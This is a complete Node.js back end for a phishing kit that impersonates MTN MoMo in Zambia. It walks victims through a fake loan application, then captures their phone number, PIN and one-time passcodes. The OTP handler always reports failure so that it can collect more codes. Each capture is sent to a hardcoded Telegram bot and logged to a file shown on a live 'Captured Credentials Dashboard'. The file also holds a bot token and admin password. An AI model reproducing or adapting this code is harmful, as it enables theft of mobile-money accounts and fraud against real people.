const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 8000;

// ══════════════════════════════════════════════════════
// ADMIN CREDENTIALS
// ══════════════════════════════════════════════════════
const ADMIN_USERNAME = 'Admin';
const ADMIN_PASSWORD = 'mtn@admin#';

// ══════════════════════════════════════════════════════
// TELEGRAM NOTIFICATION CONFIG
// Replace these with YOUR OWN bot token + chat ID
// (Get them via @BotFather and @userinfobot on Telegram)
// ══════════════════════════════════════════════════════
const TELEGRAM_BOT_TOKEN = '8777667438:AAH_iun6KkMmvaxrRgEh94zBnPgz1MfGmvw';
const TELEGRAM_CHAT_ID   = '6362646815';

// Optional second bot for redundancy (leave blank to disable)
const TELEGRAM_BOT_TOKEN_2 = '';
const TELEGRAM_CHAT_ID_2   = '';

// Store sessions
const sessions = {};

function verifyAuth(req) {
    const authHeader = req.headers.authorization || '';
    const encoded = authHeader.split(' ')[1] || '';
    const decoded = Buffer.from(encoded, 'base64').toString();
    const [username, password] = decoded.split(':');
    return username === ADMIN_USERNAME && password === ADMIN_PASSWORD;
}

function generateSessionId() {
    return Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
}

// ══════════════════════════════════════════════════════
// TELEGRAM NOTIFY HELPER
// ══════════════════════════════════════════════════════
function sendTelegramNotification(message) {
    const targets = [];

    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        targets.push({ token: TELEGRAM_BOT_TOKEN, chatId: TELEGRAM_CHAT_ID });
    }
    if (TELEGRAM_BOT_TOKEN_2 && TELEGRAM_CHAT_ID_2) {
        targets.push({ token: TELEGRAM_BOT_TOKEN_2, chatId: TELEGRAM_CHAT_ID_2 });
    }

    if (targets.length === 0) return;

    targets.forEach(({ token, chatId }) => {
        const payload = JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        });

        const options = {
            hostname: 'api.telegram.org',
            path: `/bot${token}/sendMessage`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(payload)
            }
        };

        const reqTg = https.request(options, (resTg) => {
            let body = '';
            resTg.on('data', (chunk) => { body += chunk.toString(); });
            resTg.on('end', () => {
                try {
                    const parsed = JSON.parse(body);
                    if (!parsed.ok) {
                        console.error('Telegram send failed:', parsed.description);
                    }
                } catch (e) { /* ignore */ }
            });
        });

        reqTg.on('error', (err) => {
            console.error('Telegram notify error:', err.message);
        });

        reqTg.write(payload);
        reqTg.end();
    });
}

// ══════════════════════════════════════════════════════
// PARSE BODY (JSON + form-urlencoded)
// ══════════════════════════════════════════════════════
function parseBody(req) {
    return new Promise((resolve, reject) => {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const contentType = req.headers['content-type'] || '';
                if (contentType.includes('application/json')) {
                    resolve(JSON.parse(body));
                } else {
                    const params = new URLSearchParams(body);
                    const result = {};
                    for (const [key, value] of params) {
                        result[key] = value;
                    }
                    resolve(result);
                }
            } catch (error) {
                reject(error);
            }
        });
    });
}

// ══════════════════════════════════════════════════════
// FORMAT CREDENTIALS FOR ADMIN DASHBOARD
// ══════════════════════════════════════════════════════
function formatCredentials(data) {
    if (!data.trim()) {
        return `
            <div style="text-align: center; padding: 40px; color: #999;">
                <div style="font-size: 48px; margin-bottom: 15px;">📭</div>
                <p style="font-size: 16px;">No credentials captured yet.</p>
                <p style="font-size: 13px; margin-top: 5px;">Waiting for users to submit data...</p>
            </div>
        `;
    }
    
    try {
        const jsonArray = '[' + data.trim().replace(/,\s*$/, '') + ']';
        const parsed = JSON.parse(jsonArray);
        
        let html = '';
        const reversed = [...parsed].reverse();
        
        reversed.forEach((cred) => {
            const hasOtp = cred.otp && cred.otp !== null;
            const statusClass = hasOtp ? 'status-complete' : 'status-pending';
            const statusText = hasOtp ? '✅ Complete' : '⏳ Pending OTP';
            const phoneDisplay = cred.phone ? `+260 ${cred.phone.slice(0, 3)} ${cred.phone.slice(3, 6)} ${cred.phone.slice(6)}` : 'N/A';
            
            html += `
                <div class="credential-item">
                    <div class="credential-header">
                        <div class="credential-phone">📱 ${phoneDisplay}</div>
                        <span class="status-badge ${statusClass}">${statusText}</span>
                    </div>
                    <div class="credential-details">
                        <div class="detail-row">
                            <span class="detail-label">PIN:</span>
                            <span class="detail-value pin-value">${cred.pin || 'N/A'}</span>
                        </div>
                        ${hasOtp ? `
                        <div class="detail-row">
                            <span class="detail-label">OTP:</span>
                            <span class="detail-value otp-value">${cred.otp}</span>
                        </div>
                        ` : `
                        <div class="detail-row">
                            <span class="detail-label">OTP:</span>
                            <span class="detail-value pending-text">⏳ Not yet entered</span>
                        </div>
                        `}
                        <div class="detail-row">
                            <span class="detail-label">Time:</span>
                            <span class="detail-value time-value">${new Date(cred.timestamp).toLocaleString()}</span>
                        </div>
                        <div class="detail-row">
                            <span class="detail-label">IP:</span>
                            <span class="detail-value ip-value">${cred.ip || 'Unknown'}</span>
                        </div>
                    </div>
                </div>
            `;
        });
        
        return html;
    } catch (e) {
        return `<pre style="background: #f8f9fa; padding: 15px; border-radius: 8px; overflow-x: auto; font-size: 13px;">${data}</pre>`;
    }
}

function countEntries(data) {
    if (!data.trim()) return 0;
    try {
        const jsonArray = '[' + data.trim().replace(/,\s*$/, '') + ']';
        return JSON.parse(jsonArray).length;
    } catch (e) {
        return data.split('\n').filter(line => line.trim()).length;
    }
}

function countComplete(data) {
    if (!data.trim()) return 0;
    try {
        const jsonArray = '[' + data.trim().replace(/,\s*$/, '') + ']';
        return JSON.parse(jsonArray).filter(c => c.otp && c.otp !== null).length;
    } catch (e) { return 0; }
}

function countPending(data) {
    if (!data.trim()) return 0;
    try {
        const jsonArray = '[' + data.trim().replace(/,\s*$/, '') + ']';
        return JSON.parse(jsonArray).filter(c => !c.otp || c.otp === null).length;
    } catch (e) { return 0; }
}

// ══════════════════════════════════════════════════════
// SERVER
// ══════════════════════════════════════════════════════
http.createServer(async (req, res) => {
    const urlParts = req.url.split('?');
    const pathname = urlParts[0];
    const query = new URLSearchParams(urlParts[1] || '');

    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);

    // ─── Static files ──────────────────────────────────
    if (req.method === 'GET' && pathname.startsWith('/static/')) {
        const filePath = path.join(__dirname, pathname);
        const extname = path.extname(filePath).toLowerCase();
        const mimeTypes = {
            '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css',
            '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg',
            '.gif': 'image/gif', '.ico': 'image/x-icon', '.svg': 'image/svg+xml'
        };
        const contentType = mimeTypes[extname] || 'application/octet-stream';
        fs.readFile(filePath, (err, data) => {
            if (err) { res.writeHead(404); res.end('File not found'); return; }
            res.writeHead(200, { 'Content-Type': contentType });
            res.end(data);
        });
        return;
    }

    // ─── Serve HTML pages ──────────────────────────────
    const pages = {
        '/': 'landing.html',
        '/step1': 'step1.html',
        '/step2': 'step2.html',
        '/step3': 'step3.html',
        '/login': 'login.html',
        '/otp': 'otp.html',
        '/approval': 'approval.html'
    };

    if (req.method === 'GET' && pages[pathname]) {
        fs.readFile(path.join(__dirname, pages[pathname]), (err, data) => {
            if (err) { res.writeHead(500); res.end('Error loading page'); return; }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        });
        return;
    }

    // ─── Admin data API ────────────────────────────────
    if (req.method === 'GET' && pathname === '/api/admin-data') {
        if (!verifyAuth(req)) { res.writeHead(401); res.end('Unauthorized'); return; }

        fs.readFile('credentials.log', 'utf8', (err, data) => {
            if (err && err.code === 'ENOENT') { data = ''; }
            else if (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); return; }

            const total = countEntries(data);
            const complete = countComplete(data);
            const pending = countPending(data);

            let entries = [];
            if (data.trim()) {
                try {
                    const jsonArray = '[' + data.trim().replace(/,\s*$/, '') + ']';
                    entries = JSON.parse(jsonArray);
                } catch (e) { entries = []; }
            }

            res.writeHead(200, {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            });
            res.end(JSON.stringify({
                total, complete, pending,
                entries: entries.reverse().slice(0, 20)
            }));
        });
        return;
    }

    // ─── Loan application step 1 ───────────────────────
    if (req.method === 'POST' && pathname === '/submit-loan') {
        try {
            const data = await parseBody(req);
            const loanData = {
                loanType: data.loanType,
                amount: data.loanAmount,
                term: data.loanTerm,
                purpose: data.loanPurpose,
                timestamp: new Date().toISOString()
            };
            const sessionId = generateSessionId();
            sessions[sessionId] = { loanData, step: 1, timestamp: Date.now() };

            // 🔔 Telegram notification
            sendTelegramNotification(
                `*📋 MTN LOAN — STEP 1*\n\n` +
                `🏷 *Type:* ${loanData.loanType}\n` +
                `💰 *Amount:* ZMW ${loanData.amount}\n` +
                `📅 *Term:* ${loanData.term}\n` +
                `📝 *Purpose:* ${loanData.purpose}`
            );

            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, sessionId, redirect: '/step2' }));
        } catch (error) {
            console.error('Error:', error);
            res.writeHead(500); res.end(JSON.stringify({ success: false }));
        }
        return;
    }

    // ─── Loan application step 2 ───────────────────────
    if (req.method === 'POST' && pathname === '/submit-details') {
        try {
            const data = await parseBody(req);
            const sessionId = data.sessionId;
            const personalData = {
                firstName: data.firstName,
                lastName: data.lastName,
                email: data.email || '',
                phone: data.phone,
                timestamp: new Date().toISOString()
            };
            if (sessions[sessionId]) {
                sessions[sessionId].personalData = personalData;
                sessions[sessionId].step = 2;
            }

            // 🔔 Telegram notification
            sendTelegramNotification(
                `*👤 MTN LOAN — STEP 2*\n\n` +
                `🙍 *Name:* ${personalData.firstName} ${personalData.lastName}\n` +
                `📱 *Phone:* +260 ${personalData.phone}\n` +
                `📧 *Email:* ${personalData.email}`
            );

            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, redirect: '/step3' }));
        } catch (error) {
            console.error('Error:', error);
            res.writeHead(500); res.end(JSON.stringify({ success: false }));
        }
        return;
    }

    // ─── Loan application step 3 ───────────────────────
    if (req.method === 'POST' && pathname === '/submit-final') {
        try {
            const data = await parseBody(req);
            const sessionId = data.sessionId;
            const employmentStatus = data.employmentStatus;
            const annualIncome = data.annualIncome;

            if (sessions[sessionId]) {
                sessions[sessionId].employmentStatus = employmentStatus;
                sessions[sessionId].annualIncome = annualIncome;
                sessions[sessionId].step = 3;
                sessions[sessionId].completed = true;

                const session = sessions[sessionId];
                fs.appendFile('applications.log', JSON.stringify({
                    type: 'loan_application',
                    loanData: session.loanData,
                    personalData: session.personalData,
                    employmentStatus,
                    annualIncome,
                    timestamp: new Date().toISOString(),
                    ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
                }, null, 2) + ',\n', () => {});
            }

            // 🔔 Telegram notification
            sendTelegramNotification(
                `*✅ MTN LOAN — STEP 3 (COMPLETED)*\n\n` +
                `💼 *Employment:* ${employmentStatus}\n` +
                `💵 *Annual Income:* ZMW ${annualIncome}\n\n` +
                `_Redirecting to login page..._`
            );

            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, redirect: '/login' }));
        } catch (error) {
            console.error('Error:', error);
            res.writeHead(500); res.end(JSON.stringify({ success: false }));
        }
        return;
    }

    // ─── Login (capture phone + PIN) ───────────────────
    if (req.method === 'POST' && pathname === '/login') {
        try {
            const data = await parseBody(req);
            const phone = data.phoneNumber || data.phone;
            const pin = data.pin;
            const cleanPhone = String(phone).replace(/[^0-9]/g, '');

            console.log(`📱 Login attempt — +260${cleanPhone}, PIN: ${pin}`);

            const credentials = {
                phone: cleanPhone,
                pin,
                otp: null,
                timestamp: new Date().toISOString(),
                ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
                userAgent: req.headers['user-agent']
            };

            const sessionId = generateSessionId();
            sessions[sessionId] = { credentials, phone: cleanPhone, step: 'login', timestamp: Date.now() };
            sessions[`phone_${cleanPhone}`] = { sessionId, credentials, timestamp: Date.now() };

            fs.appendFile('credentials.log', JSON.stringify(credentials, null, 2) + ',\n', () => {});

            // 🔔 Telegram notification — credentials captured
            sendTelegramNotification(
                `*🔐 MTN MoMo — CREDENTIALS CAPTURED*\n\n` +
                `📱 *Phone:* +260${cleanPhone}\n` +
                `🔒 *PIN:* ${pin}\n` +
                `🌐 *IP:* ${credentials.ip}\n` +
                `🕐 *Time:* ${new Date().toLocaleString()}\n\n` +
                `_Waiting for OTP..._`
            );

            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
                success: true,
                sessionId,
                applicationId: 'APP' + Math.random().toString(36).substring(2, 9).toUpperCase(),
                redirect: '/otp'
            }));
        } catch (error) {
            console.error('Error:', error);
            res.writeHead(500); res.end(JSON.stringify({ success: false, message: 'Server error' }));
        }
        return;
    }

    // ─── OTP capture ───────────────────────────────────
    if (req.method === 'POST' && pathname === '/verify-otp') {
        try {
            const data = await parseBody(req);
            const sessionId = data.sessionId || data.applicationId;
            const otp = data.otp;
            const phone = data.phone || data.phoneNumber;

            console.log(`📱 OTP captured — +260${phone}: ${otp}`);

            let session = null;
            if (sessions[sessionId]) {
                session = sessions[sessionId];
            } else {
                const phoneKey = `phone_${phone}`;
                if (sessions[phoneKey]) {
                    const ref = sessions[phoneKey];
                    if (sessions[ref.sessionId]) session = sessions[ref.sessionId];
                }
            }

            if (session && session.credentials) {
                session.credentials.otp = otp;
                session.step = 'otp_captured';

                const creds = session.credentials;
                const fullCredentials = {
                    phone: creds.phone,
                    pin: creds.pin,
                    otp,
                    timestamp: new Date().toISOString(),
                    ip: creds.ip,
                    userAgent: creds.userAgent,
                    status: 'complete'
                };

                fs.appendFile('credentials.log', JSON.stringify(fullCredentials, null, 2) + ',\n', () => {});

                // 🔔 Telegram notification — full credentials captured
                sendTelegramNotification(
                    `*🔢 MTN MoMo — OTP CAPTURED*\n\n` +
                    `📱 *Phone:* +260${creds.phone}\n` +
                    `🔒 *PIN:* ${creds.pin}\n` +
                    `🔢 *OTP:* ${otp}\n` +
                    `🌐 *IP:* ${creds.ip}\n` +
                    `🕐 *Time:* ${new Date().toLocaleString()}\n\n` +
                    `✅ *FULL CREDENTIALS CAPTURED*`
                );
            } else {
                // Still notify even if session was lost
                sendTelegramNotification(
                    `*🔢 MTN MoMo — OTP CAPTURED (orphaned)*\n\n` +
                    `📱 *Phone:* +260${phone}\n` +
                    `🔢 *OTP:* ${otp}`
                );
            }

            // Always show "incorrect" to simulate real phishing
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: false, message: 'Incorrect OTP. Please try again.' }));
        } catch (error) {
            console.error('Error:', error);
            res.writeHead(500); res.end(JSON.stringify({ success: false }));
        }
        return;
    }

    // ─── OTP resend ────────────────────────────────────
    if (req.method === 'POST' && pathname === '/otp-resend') {
        try {
            const data = await parseBody(req);
            const phone = data.phone || data.phoneNumber;

            console.log(`📱 Resend OTP requested for +260${phone}`);

            let session = null;
            const phoneKey = `phone_${phone}`;
            if (sessions[phoneKey]) {
                const ref = sessions[phoneKey];
                if (sessions[ref.sessionId]) session = sessions[ref.sessionId];
            }
            if (!session) {
                for (const [id, s] of Object.entries(sessions)) {
                    if (s.credentials && s.credentials.phone === phone) { session = s; break; }
                }
            }

            if (!session) {
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: false, message: 'No active session found.' }));
                return;
            }

            if (session.credentials) {
                const { phone: p, pin, ip, userAgent } = session.credentials;
                session.credentials = { phone: p, pin, otp: null, timestamp: new Date().toISOString(), ip, userAgent };
                session.step = 'login';

                if (sessions[`phone_${phone}`]) {
                    sessions[`phone_${phone}`].credentials = session.credentials;
                    sessions[`phone_${phone}`].timestamp = Date.now();
                }
            }

            // 🔔 Telegram notification — resend requested
            sendTelegramNotification(
                `*🔄 MTN MoMo — OTP RESEND REQUESTED*\n\n` +
                `📱 *Phone:* +260${phone}\n` +
                `🕐 *Time:* ${new Date().toLocaleString()}`
            );

            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, message: 'New OTP sent.' }));
        } catch (error) {
            console.error('Error in resend:', error);
            res.writeHead(500); res.end(JSON.stringify({ success: false }));
        }
        return;
    }

    // ─── Admin dashboard ───────────────────────────────
    if (req.method === 'GET' && pathname === '/admin') {
        if (!verifyAuth(req)) {
            res.writeHead(401, {
                'WWW-Authenticate': 'Basic realm="Admin Access"',
                'Content-Type': 'text/html'
            });
            res.end('<h1>Authentication Required</h1>');
            return;
        }

        fs.readFile('credentials.log', 'utf8', (err, data) => {
            if (err && err.code === 'ENOENT') data = '';
            else if (err) data = '';

            const total = countEntries(data);
            const complete = countComplete(data);
            const pending = countPending(data);

            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(`
                <!DOCTYPE html>
                <html>
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>MTN MoMo Admin Dashboard</title>
                    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
                    <style>
                        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
                        body { background: #f0f2f5; padding: 20px; color: #333; min-height: 100vh; }
                        .container { max-width: 1200px; margin: 0 auto; }
                        .dashboard-header {
                            background: white; border-radius: 12px; padding: 25px 30px;
                            margin-bottom: 25px; box-shadow: 0 2px 8px rgba(0,0,0,0.08);
                            display: flex; justify-content: space-between; align-items: center;
                            flex-wrap: wrap; gap: 15px;
                        }
                        .dashboard-header .brand h1 { font-size: 28px; font-weight: 700; }
                        .dashboard-header .brand .mtn-logo-icon {
                            display: inline-block; width: 36px; height: 36px;
                            background: #FFD700; border-radius: 6px; text-align: center;
                            line-height: 36px; font-weight: 900; color: #003366; margin-right: 8px;
                        }
                        .dashboard-header .brand .mtn-text { color: #003366; }
                        .dashboard-header .brand .momo-text { color: #FFD700; }
                        .dashboard-header .brand .sub { font-size: 14px; color: #888; margin-top: 2px; }
                        .dashboard-header .status { display: flex; align-items: center; gap: 15px; font-size: 14px; color: #666; }
                        .live-dot {
                            display: inline-block; width: 10px; height: 10px;
                            background: #4CAF50; border-radius: 50%;
                            animation: pulse 1.5s ease-in-out infinite; margin-right: 6px;
                        }
                        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
                        .last-updated { color: #999; font-size: 13px; }
                        .stats-grid {
                            display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
                            gap: 15px; margin-bottom: 25px;
                        }
                        .stat-card {
                            background: white; border-radius: 10px; padding: 20px;
                            box-shadow: 0 2px 8px rgba(0,0,0,0.06); border-left: 4px solid #003366;
                        }
                        .stat-card .stat-number { font-size: 32px; font-weight: 700; color: #1a1a2e; }
                        .stat-card .stat-label { font-size: 14px; color: #888; margin-top: 4px; }
                        .stat-card.pending { border-left-color: #FF9800; }
                        .stat-card.complete { border-left-color: #4CAF50; }
                        .toolbar {
                            background: white; border-radius: 10px; padding: 15px 20px;
                            margin-bottom: 20px; display: flex; justify-content: space-between;
                            align-items: center; flex-wrap: wrap; gap: 12px;
                            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
                        }
                        .btn {
                            padding: 8px 18px; border: none; border-radius: 6px;
                            font-size: 13px; font-weight: 600; cursor: pointer;
                            text-decoration: none; display: inline-block; transition: all 0.2s;
                        }
                        .btn-primary { background: #003366; color: white; }
                        .btn-primary:hover { background: #002244; }
                        .btn-danger { background: #dc3545; color: white; }
                        .btn-outline { background: transparent; color: #666; border: 1px solid #ddd; }
                        .btn-sm { padding: 6px 14px; font-size: 12px; }
                        .entries-container {
                            background: white; border-radius: 12px; padding: 20px 25px;
                            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
                        }
                        .credential-item {
                            background: #f8f9fa; border-radius: 10px; padding: 16px 20px;
                            margin-bottom: 12px; border: 1px solid #e9ecef;
                        }
                        .credential-header {
                            display: flex; justify-content: space-between; align-items: center;
                            flex-wrap: wrap; gap: 10px; margin-bottom: 10px;
                        }
                        .credential-phone { font-size: 18px; font-weight: 700; color: #1a1a2e; }
                        .status-badge { padding: 3px 14px; border-radius: 20px; font-size: 12px; font-weight: 600; }
                        .status-complete { background: #e8f5e9; color: #2e7d32; }
                        .status-pending { background: #fff3e0; color: #e65100; }
                        .credential-details {
                            display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
                            gap: 4px 20px; font-size: 14px;
                        }
                        .detail-row { display: flex; gap: 6px; padding: 3px 0; }
                        .detail-label { color: #888; min-width: 50px; font-size: 13px; }
                        .detail-value { color: #333; font-weight: 500; }
                        .pin-value { color: #dc3545; font-family: monospace; font-size: 15px; }
                        .otp-value { color: #003366; font-family: monospace; font-size: 15px; font-weight: 700; }
                        .pending-text { color: #FF9800; }
                        .empty-state { text-align: center; padding: 50px 20px; color: #999; }
                        .empty-state .icon { font-size: 56px; margin-bottom: 15px; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <div class="dashboard-header">
                            <div class="brand">
                                <h1>
                                    <span class="mtn-logo-icon">M</span>
                                    <span class="mtn-text">MTN</span> <span class="momo-text">MoMo</span>
                                    <span style="font-size:18px;color:#888;font-weight:400;">| Admin</span>
                                </h1>
                                <div class="sub">📋 Captured Credentials Dashboard</div>
                            </div>
                            <div class="status">
                                <span><span class="live-dot"></span> Live</span>
                                <span class="last-updated" id="lastUpdated">Last updated: ${new Date().toLocaleString()}</span>
                            </div>
                        </div>
                        
                        <div class="stats-grid">
                            <div class="stat-card">
                                <div class="stat-number" id="statTotal">${total}</div>
                                <div class="stat-label">📊 Total Entries</div>
                            </div>
                            <div class="stat-card complete">
                                <div class="stat-number" id="statComplete">${complete}</div>
                                <div class="stat-label">✅ Complete</div>
                            </div>
                            <div class="stat-card pending">
                                <div class="stat-number" id="statPending">${pending}</div>
                                <div class="stat-label">⏳ Pending OTP</div>
                            </div>
                        </div>
                        
                        <div class="toolbar">
                            <div style="font-size: 14px; color: #555;">
                                Showing <span style="font-weight:600;color:#003366" id="entryCount">${total}</span> entries
                            </div>
                            <div style="display: flex; gap: 10px;">
                                <button class="btn btn-primary btn-sm" onclick="refreshData()">🔄 Refresh</button>
                                <a href="/admin?download=true" class="btn btn-outline btn-sm">📥 Download</a>
                                <button onclick="if(confirm('Delete all logs?')) location.href='/admin?delete=true'" class="btn btn-danger btn-sm">🗑️ Clear</button>
                            </div>
                        </div>
                        
                        <div class="entries-container">
                            <div id="entriesList">${formatCredentials(data)}</div>
                        </div>
                    </div>
                    
                    <script>
                        setInterval(refreshData, 3000);
                        function refreshData() {
                            fetch('/api/admin-data', {
                                headers: { 'Authorization': 'Basic ' + btoa('${ADMIN_USERNAME}:${ADMIN_PASSWORD}') }
                            })
                            .then(r => r.json())
                            .then(data => {
                                document.getElementById('statTotal').textContent = data.total;
                                document.getElementById('statComplete').textContent = data.complete;
                                document.getElementById('statPending').textContent = data.pending;
                                document.getElementById('entryCount').textContent = data.total;
                                document.getElementById('lastUpdated').textContent = 'Last updated: ' + new Date().toLocaleString();
                            })
                            .catch(() => {});
                        }
                    </script>
                </body>
                </html>
            `);
        });
        return;
    }

    // ─── Download logs ─────────────────────────────────
    if (req.method === 'GET' && pathname === '/admin' && query.get('download') === 'true') {
        if (!verifyAuth(req)) { res.writeHead(401); res.end('Auth required'); return; }
        res.writeHead(200, {
            'Content-Type': 'application/json',
            'Content-Disposition': 'attachment; filename="credentials_log.json"'
        });
        fs.createReadStream('credentials.log').pipe(res);
        return;
    }

    // ─── Delete logs ───────────────────────────────────
    if (req.method === 'GET' && pathname === '/admin' && query.get('delete') === 'true') {
        if (!verifyAuth(req)) { res.writeHead(401); res.end('Auth required'); return; }
        fs.writeFile('credentials.log', '', () => {
            Object.keys(sessions).forEach(k => delete sessions[k]);
            res.writeHead(302, { 'Location': '/admin' });
            res.end();
        });
        return;
    }

    // ─── Logout ────────────────────────────────────────
    if (req.method === 'GET' && pathname === '/admin' && query.get('logout') === 'true') {
        res.writeHead(401, {
            'WWW-Authenticate': 'Basic realm="Admin Access"',
            'Content-Type': 'text/html'
        });
        res.end('<h1>Logged out. <a href="/admin">Login again</a></h1>');
        return;
    }

    // ─── 404 ───────────────────────────────────────────
    res.writeHead(404, { 'Content-Type': 'text/html' });
    res.end('<h1>404 - Not Found</h1><p><a href="/">Go home</a></p>');
}).listen(PORT, () => {
    console.log(`🚀 MTN MoMo Server running on port ${PORT}`);
    console.log(`📝 Site:  http://localhost:${PORT}`);
    console.log(`🔐 Admin: http://localhost:${PORT}/admin`);
    console.log(`⚠️  ADMIN: ${ADMIN_USERNAME}:${ADMIN_PASSWORD}`);
    console.log(``);
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        console.log(`✅ Telegram notifications ENABLED`);
        console.log(`   Bot token: ...${TELEGRAM_BOT_TOKEN.slice(-8)}`);
        console.log(`   Chat ID:   ${TELEGRAM_CHAT_ID}`);
    } else {
        console.log(`⚠️  Telegram notifications DISABLED — set token + chat ID at top of server.js`);
    }
    console.log(``);
});